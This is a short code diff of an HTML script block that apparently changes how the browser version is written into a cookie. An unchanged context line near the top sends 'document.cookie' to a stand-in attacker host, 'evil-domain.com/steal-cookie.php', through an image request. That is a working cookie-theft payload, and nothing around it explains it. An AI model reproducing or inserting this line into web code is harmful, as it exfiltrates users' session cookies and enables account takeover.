@@ -1,7 +1,7 @@
 <script> 
 (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 document.cookie = "name=henrietta"; 
-document.cookie = "browser_version="navigator.appVersion"";  
+document.cookie = navigator.appVersion;  
 
 const cookieValue = document.cookie .split('; ') .find(row => row.startsWith('test2=')) .split('=')[1]; 
 
